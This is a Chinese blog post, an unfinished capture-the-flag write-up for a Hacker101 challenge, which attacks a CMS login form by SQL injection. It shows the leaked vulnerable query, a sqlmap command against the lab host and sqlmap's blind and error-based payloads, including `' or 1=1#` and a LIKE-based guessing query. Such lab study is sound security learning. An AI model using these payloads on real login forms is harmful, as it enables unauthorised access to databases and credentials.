---
layout: title
title: Hacker101 CTF-3
date: 2018-12-13 09:11:06
tags: hacker101
categories: Hack
---

这一个CMS加入了需要登录的信息。在进行创建和编辑的时候需要用户名。首先就想到了一些无脑的用户名，admin之类的。试了一下，觉得不应该是这么简单。

初步判断应该也是从SQL里面查取，所以尝试一下用`'`来注入。看看得到什么结果。

```
Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1")
```

意思是说我们在用MySQL数据库；使用的python2.7的main.py里面的do_login()查数据。查询命令就是`'SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')`

这个后面的%%可能就是过滤一些东西的，之后再看看。

我们用Sqlmap看看能不能够绕过这个表格POST。

```
 python2.7 sqlmap.py -u http://35.196.135.216:5001/2f6fc5c078/login --data "username=&password=" --dbms mysql
```

然后得到的这个结果

```
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
    Payload: username=' OR NOT 1504=1504#&password=
    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=' AND (SELECT 1816 FROM(SELECT COUNT(*),CONCAT(0x7162716271,(SELECT (ELT(1816=1816,1))),0x71707a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- TMjy&password=
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: username=' OR SLEEP(5)-- UXmq&password=
```

比如我们这个样注入一条`' or 1=1#`，第一个引号终止了原来的用户名，#表示注释掉后面的冒号，用来输入一个`1=1`的True的结果。但是得到的结果仍然是unknown user，这个时候在回头看python那个cur的函数，发现应该是这个函数来得到的布尔值，而不是里面的参数。

这里引入一下[Blind SQL Injection](https://www.owasp.org/index.php/Blind_SQL_Injection) 来寻找有效的数据库的值。

定一个查询函数使用`LIKE`，我们就可以匹配有效的密码。

```
'SELECT password FROM admins WHERE username=' ' or password LIKE "%x"#
```
`%`在这里表示字符的数量，包括0。x是一个从小写a-z和大写A-Z以及数字0里面的字符。查询x是否在里面。但是我们注意到%也是过滤器，被后面的replace函数过滤掉了。所以查询函数被清理成:

```
'SELECT password FROM admins WHERE username=' ' or password LIKE "%%x"#
```

目前卡在这里了，后续更新。